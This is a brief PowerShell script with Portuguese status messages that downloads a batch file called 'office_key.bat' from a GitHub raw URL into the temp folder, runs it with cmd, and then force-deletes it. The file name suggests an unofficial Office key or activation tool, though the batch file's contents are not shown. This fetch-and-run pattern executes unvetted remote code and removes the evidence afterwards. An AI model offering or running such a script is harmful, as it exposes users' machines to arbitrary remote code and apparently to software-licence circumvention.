Write-Host "Baixando arquivo.bat..."

$bat = "$env:TEMP\arquivo.bat"

irm https://raw.githubusercontent.com/ricardoprg2022-commits/rn_informatica/refs/heads/main/office_key.bat -OutFile $bat

cmd /c $bat

Remove-Item $bat -Force

Write-Host "Finalizado."
